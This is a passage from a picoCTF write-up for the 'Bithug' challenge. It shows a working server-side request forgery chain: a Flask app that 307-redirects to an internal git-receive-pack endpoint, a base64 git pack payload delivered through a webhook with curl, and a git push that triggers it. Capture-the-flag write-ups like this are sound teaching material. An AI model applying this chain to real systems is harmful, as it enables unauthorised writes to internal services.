from flask import Flask, redirect

application = app = Flask(__name__)


@app.route('/', methods=["POST", "GET"])
def index():
    return redirect("http://127.0.0.1:1823/_/abbas.git/git-receive-pack", code=307)



if __name__ == '__main__':
    application.run(host='0.0.0.0', debug=True)
```

Note, it has to be a `307` redirect or else the incoming requests will be ignored.

Let's prepare our payload for creating a webhook

```javascript
{
    "url":"<flask_app_url>",
    "body":"MDA5NDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAgYTIxMjk5OGE1ZWMy\nNjcxNTdhMzliZGI3OTBkMzAzMDk0ODJlNTE0MiByZWZzL21ldGEvY29uZmlnACByZXBvcnQtc3Rh\ndHVzIHNpZGUtYmFuZC02NGsgYWdlbnQ9Z2l0LzIuMjUuMTAwMDBQQUNLAAAAAgAAAAObDHicpcxB\nCsIwEEDRfU4xe1Eyk8a2IKKoCy2ooBdImykttI7E6f2tZ3DzF3/xNDEDZY4azAuKMfdZQdTW5IMt\nM/JtZGxpftbVpQmTdpIgiShsft0dT4/qebsvr4dzdUG3GqQJQ5Qx9K8t4Brz0nokhIX1zppGxrFX\n5T8Is4+RIwSYPjOjAtoxJH6L+QLC2jwEpwJ4nDM0MDAzMVFITE5OLS7WS87PS2P4HFvL587w+21l\nrOvDWSuXMz4z87gPAAvWD8o2eJxLTEpKLOYCAAfRAgQwmk7fmQ7mFM/fv58rF62IYBYhEg==",
    "contentType":"application/x-git-receive-pack-result"
}
```

I am going to use curl so here's my request. Note that you'll need to grab the authentication cookie from your browser

```bash
curl -i -X POST -H "Content-Type: application/json" --cookie "user-token=81bb7700-be5a-44d4-8ab3-41de4d3d3748" -d '{"url":"<flask_app_url>","body":"MDA5NDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAgYTIxMjk5OGE1ZWMy\nNjcxNTdhMzliZGI3OTBkMzAzMDk0ODJlNTE0MiByZWZzL21ldGEvY29uZmlnACByZXBvcnQtc3Rh\ndHVzIHNpZGUtYmFuZC02NGsgYWdlbnQ9Z2l0LzIuMjUuMTAwMDBQQUNLAAAAAgAAAAObDHicpcxB\nCsIwEEDRfU4xe1Eyk8a2IKKoCy2ooBdImykttI7E6f2tZ3DzF3/xNDEDZY4azAuKMfdZQdTW5IMt\nM/JtZGxpftbVpQmTdpIgiShsft0dT4/qebsvr4dzdUG3GqQJQ5Qx9K8t4Brz0nokhIX1zppGxrFX\n5T8Is4+RIwSYPjOjAtoxJH6L+QLC2jwEpwJ4nDM0MDAzMVFITE5OLS7WS87PS2P4HFvL587w+21l\nrOvDWSuXMz4z87gPAAvWD8o2eJxLTEpKLOYCAAfRAgQwmk7fmQ7mFM/fv58rF62IYBYhEg==","contentType":"application/x-git-receive-pack-result"}' http://venus.picoctf.net:49771/abbas/abbas.git/webhooks

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 2
ETag: W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"
Date: Thu, 08 Apr 2021 18:30:37 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

Great, We are ready without webhook

**Step 3:**

Now we just need to trigger our webhook by doing a git push to our `abbas/abbas` repository.

```bash
$ echo "Hi" > hi.txt
$ git add .
$ git commit -m "pwn"
$ git push
```

Perfect! Now let us try to open `_/abbas` on Bithug.

![](../.gitbook/assets/image%20%2813%29.png)

**Flag:** picoCTF{good\_job\_at\_gitting\_good}

